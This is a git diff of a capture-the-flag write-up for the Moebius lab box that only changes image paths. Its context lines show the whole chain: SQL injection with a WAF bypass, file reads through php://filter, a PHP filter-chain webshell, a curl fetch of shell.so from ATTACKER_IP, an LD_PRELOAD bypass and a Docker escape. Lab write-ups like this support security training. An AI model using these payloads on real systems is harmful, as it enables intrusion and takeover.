@@ -36,22 +36,22 @@ There are just two ports open:
 
 Not much to to on this version of OpenSSH without credentials so I leave a few Gobuster scans in the background to find subdirectories/subdomains before heading over to the webpage. The landing page shows an storage place for cat pictures with a few albums available.
 
-![](../assets/img/2026-02-13-Moebius/1.png)
+![](/assets/img/2026-02-13-Moebius/1.png)
 
 There are three separate tabs each holding a few JPGs of normal cat photos. I notice that each URL contains a hash and path parameter for each image stored inside of `/var/www/images/`. Ignore the QR code in Smart Cats, it's a rickroll :).
 
-![](../assets/img/2026-02-13-Moebius/2.png)
+![](/assets/img/2026-02-13-Moebius/2.png)
 
 Capturing a request to one of these photos shows that we are indeed required to use both of these for a valid query. At this point, I tried parameter pollution payloads to try and trick the server into overriding the file path of the `.jpg` to be `/etc/passwd`. 
 
-![](../assets/img/2026-02-13-Moebius/3.png)
+![](/assets/img/2026-02-13-Moebius/3.png)
 
 This doesn't work and it looks like the server takes the hash value of each file and compares it to the one provided in the URL. The `image.php` does not seem to be very prone to exploits so I swap over to `album.php`. 
 
 ## SQL Injection
 I'm thinking that since these albums are divided into separate types, they're being stored in a database and that the album.php takes in a query to display all images within that table. I make a cURL request to that file and the server throws a SQL syntax error.
 
-![](../assets/img/2026-02-13-Moebius/4.png)
+![](/assets/img/2026-02-13-Moebius/4.png)
 
 Awesome, I'm just going to send a captured request over to SQLmap since I've done very similar steps in other boxes multiple times already today. 
 
@@ -59,7 +59,7 @@ Awesome, I'm just going to send a captured request over to SQLmap since I've don
 sqlmap -r cat.req --batch
 ```
 
-![](../assets/img/2026-02-13-Moebius/5.png)
+![](/assets/img/2026-02-13-Moebius/5.png)
 
 The `short_tag` parameter is prone to SQL injection in a few ways, the easiest being a `UNION` statement where we can just append different queries to enumerate the database. Here are a few good reads for reference if you decide to do this step manually (good practice as well).
 
@@ -72,7 +72,7 @@ First we want to list all databases available to us.
 sqlmap -r cat.req --dbs
 ```
 
-![](../assets/img/2026-02-13-Moebius/6.png)
+![](/assets/img/2026-02-13-Moebius/6.png)
 
 That just gives us a web DB which we can pull tables/columns from.
 
@@ -80,7 +80,7 @@ That just gives us a web DB which we can pull tables/columns from.
 sqlmap -r cat.req -D web --tables
 ```
 
-![](../assets/img/2026-02-13-Moebius/7.png)
+![](/assets/img/2026-02-13-Moebius/7.png)
 
 Now let's dump both of these for any potential information not listed on the website.
 
@@ -88,13 +88,13 @@ Now let's dump both of these for any potential information not listed on the web
 sqlmap -r cat.req -D web -T albums --dump
 ```
 
-![](../assets/img/2026-02-13-Moebius/8.png)
+![](/assets/img/2026-02-13-Moebius/8.png)
 
 ```
 sqlmap -r cat.req -D web -T images --dump
 ```
 
-![](../assets/img/2026-02-13-Moebius/9.png)
+![](/assets/img/2026-02-13-Moebius/9.png)
 
 Well, that's underwhelming but at least we know that there's nothing else to find under those directories. Since `UNION` statements were accepted, I tested a few payloads to write a webshell to the server in a malicious query (yes that's possible), but it seemed like stacked queries were disabled meaning that we can't use an `INSERT INTO` statement to write somewhere. It's worth mentioning that special characters such as `/` or `;` are sniped by the WAF so this has turned into a dead end in regards to retrieving sensitive info.
 
@@ -118,7 +118,7 @@ SQL statements [1]:
 
 The server is just selecting the `id` field from the albums table from our specified query. Something worth noting is that by supplying a successful `short_tag` (ie. cute or smart), the response populates the file paths for such images.
 
-![](../assets/img/2026-02-13-Moebius/10.png)
+![](/assets/img/2026-02-13-Moebius/10.png)
 
 So my guess is that this application does something like store the input from our `short_tag` query and then send it to another statement where the result is processed to populate files within it. I'm not exactly sure that this is going on but the flow would look something like this:
 
@@ -138,7 +138,7 @@ Judging by the output of a simple `UNION` statement, we have control over the `a
 /album.php?short_tag=doesnotexist' UNION SELECT 0-- -
 ```
 
-![](../assets/img/2026-02-13-Moebius/11.png)
+![](/assets/img/2026-02-13-Moebius/11.png)
 
 Now this was the part I was stuck on for a while, I knew that we needed to pass our value into another query, but we couldn't stack them with special characters. Doing a deep-dive on nested SQL queries finally gave me the answer I was looking for. I knew of this technique but had never integrated it within any exploits so this was a very interesting topic for me.
 
@@ -168,7 +168,7 @@ In our case we'd like to provide the second query, which intakes the `album_id` 
 /album.php?short_tag=doesnotexist' UNION SELECT "0 OR 1=1-- -"-- -
 ```
 
-![](../assets/img/2026-02-13-Moebius/12.png)
+![](/assets/img/2026-02-13-Moebius/12.png)
 
 Awesome, now we know that it's possible to manipulate the path parameter in image.php, we can provide it with /etc/passwd in an attempt for LFI.
 
@@ -176,11 +176,11 @@ Awesome, now we know that it's possible to manipulate the path parameter in imag
 /album.php?short_tag=doesnotexist' UNION SELECT "0 UNION SELECT 1,2,'/etc/passwd'-- -"-- -
 ```
 
-![](../assets/img/2026-02-13-Moebius/13.png)
+![](/assets/img/2026-02-13-Moebius/13.png)
 
 Whoops, the forward slashes are being detected as a hacking attempt. We can just hex encode our file path to maintain functionality and bypass the WAF.
 
-![](../assets/img/2026-02-13-Moebius/14.png)
+![](/assets/img/2026-02-13-Moebius/14.png)
 
 Be sure to prepend 0x to the string and give it a try.
 
@@ -188,11 +188,11 @@ Be sure to prepend 0x to the string and give it a try.
 /album.php?short_tag=doesnotexist' UNION SELECT "0 UNION SELECT 1,2,'0x2f6574632f706173737764'-- -"-- -
 ```
 
-![](../assets/img/2026-02-13-Moebius/15.png)
+![](/assets/img/2026-02-13-Moebius/15.png)
 
 Upon a successful attempt, the server responds with a value of `9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d` for the hash and an image path pointing towards `/etc/passwd`. Throwing that URL into a GET request will print the contents of the file.
 
-![](../assets/img/2026-02-13-Moebius/16.png)
+![](/assets/img/2026-02-13-Moebius/16.png)
 
 Alright, we can successfully read files on the server but there don't seem to be any users with a shell other than root. **How do we get remote command execution from LFI?** It's possible to chain PHP filters to basically include code within our own fabricated file (more on that later). Before getting to that, we are going to need to know how exactly the application calculates the hash value for each file as well as any secret keys used in the process.
 
@@ -205,7 +205,7 @@ php://filter/convert.base64-encode/resource=album.php
 
 We still have to hex encode this and repeat the previous steps, so nothing new there. That results in an encoded block of data that we can decode to read the file's contents.
 
-![](../assets/img/2026-02-13-Moebius/17.png)
+![](/assets/img/2026-02-13-Moebius/17.png)
 
 Parsing the PHP code shows that it includes a dbconfig.php file which should contain the $SECRET_KEY variable we want.
 
@@ -286,7 +286,7 @@ I repeat the exact same steps for the dbconfig.php file to extract all secrets p
 php://filter/convert.base64-encode/resource=album.php
 ```
 
-![](../assets/img/2026-02-13-Moebius/18.png)
+![](/assets/img/2026-02-13-Moebius/18.png)
 
 Ok we should have all the necessary information to exploit a PHP filters chain exploit to grant us RCE on the box. Notably, the server calculates the hash value with:
 
@@ -310,7 +310,7 @@ print(signature)
 
 I test this out by calculating the hash value for album.php and decoding a cURL request while using it. This confirms we can validate any files we give the server using this script to grab a hash for it. 
 
-![](../assets/img/2026-02-13-Moebius/19.png)
+![](/assets/img/2026-02-13-Moebius/19.png)
 
 To convert this LFI vulnerability into remote command execution to grab a shell, we must to use a PHP filters chain. [This article](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it) is great at explaining how the use of PHP filters allows for this exploit to take place.
 
@@ -322,7 +322,7 @@ I'll be using [Synacktiv's php_filter_chain_generator.py](https://github.com/syn
 python3 ./php_filter_chain_generator.py --chain '<?=eval($_GET[0])?>'
 ```
 
-![](../assets/img/2026-02-13-Moebius/20.png)
+![](/assets/img/2026-02-13-Moebius/20.png)
 
 To make it a bit easier on ourselves, I make another script that will serve to execute PHP code on the server in an interactive-like style.
 
@@ -363,7 +363,7 @@ while True:
 
 Now when executing the python script, we should be able to supply system commands. I'll test this with a short id payload to see if it works.
 
-![](../assets/img/2026-02-13-Moebius/21.png)
+![](/assets/img/2026-02-13-Moebius/21.png)
 
 Hmm, it throws an error saying that we made a call to an undefined function. This probably means that the server has disabled certain functions to prevent such a case from happening. We can actually check this using an echo cmd.
 
@@ -371,7 +371,7 @@ Hmm, it throws an error saying that we made a call to an undefined function. Thi
 echo ini_get("disable_functions");
 ```
 
-![](../assets/img/2026-02-13-Moebius/22.png)
+![](/assets/img/2026-02-13-Moebius/22.png)
 
 Wow, that doesn't leave us a whole lot to work with. I begin researching any functions we're able to actually use in order to execute commands on the system and honestly I couldn't find anything. Shout out to [Jaxafed](https://jaxafed.github.io/) as his writeup on this box led me to this [hacktricks article](https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass) which explains that some PHP functions such as `mail()` will execute binaries on the system, and in doing so we're able to utilize the `LD_PRELOAD` environment variable to load arbitrary libraries to run anything. If you've ever used this method for privilege escalation, you know how nice it is when this works.
 
@@ -399,7 +399,7 @@ Next, I upload it to the server and save it to `/tmp/shell.so` for later use.
 $ch = curl_init('http://ATTACKER_IP/shell.so');curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);file_put_contents('/tmp/shell.so', curl_exec($ch)); curl_close($ch);
 ```
 
-![](../assets/img/2026-02-13-Moebius/23.png)
+![](/assets/img/2026-02-13-Moebius/23.png)
 
 The final step in grabbing a shell is to use the `putenv()` function to set the `LD_PRELOAD` variable to our malicious library and execute the mail function after so that it procs our shell. Be sure to have a Netcat listener running at this point too.
 
@@ -419,7 +419,7 @@ ENTER
 ENTER
 ```
 
-![](../assets/img/2026-02-13-Moebius/24.png)
+![](/assets/img/2026-02-13-Moebius/24.png)
 
 Right away I see that our domain is a wierd long string, telling me we're inside of a container. Now it makes sense why we couldn't spawn a python shell. We also have full Sudo permissions so, let's switch users to root and find a way to escape it. Escaping containers is pretty simple once we have root privs, so let's find out what capabilities we have access to.
 
@@ -427,7 +427,7 @@ Right away I see that our domain is a wierd long string, telling me we're inside
 cat /proc/self/status
 ```
 
-![](../assets/img/2026-02-13-Moebius/25.png)
+![](/assets/img/2026-02-13-Moebius/25.png)
 
 The Effective Capabilities (CapEff)  value will disclose what to use. I use the capsh tool to list everything on my local machine.
 
@@ -435,7 +435,7 @@ The Effective Capabilities (CapEff)  value will disclose what to use. I use the 
 capsh --decode=000001ffffffffff
 ```
 
-![](../assets/img/2026-02-13-Moebius/26.png)
+![](/assets/img/2026-02-13-Moebius/26.png)
 
 ### Escaping Docker Container
 Alright that gives us a whole lot to work with, however the quickest way is to mount the host's root file system and generate a public SSH key to put into their authorized_keys folder so that we can just login via SSH. I like using the ed25519 key format as it's much shorter to echo into a file. 
@@ -444,12 +444,12 @@ Alright that gives us a whole lot to work with, however the quickest way is to m
 ssh-keygen -f id_ed25519 -t ed25519
 ```
 
-![](../assets/img/2026-02-13-Moebius/27.png)
+![](/assets/img/2026-02-13-Moebius/27.png)
 
 ### Finding Root Flag
 After echoing our pubkey into the mounted root filesystem, we can use our private key from the pair generated to login as root user and grab the user flag under their home directory.
 
-![](../assets/img/2026-02-13-Moebius/28.png)
+![](/assets/img/2026-02-13-Moebius/28.png)
 
 We have full access over the box and the theme of it is a Moebious strip, hinting that we need to go back to the beginning in order to capture the root flag. Knowing that the database for the challenge is hosted in another container, we can check to see where it's running from by checking `docker-compose.yml` under `/root/challenge/`.
 
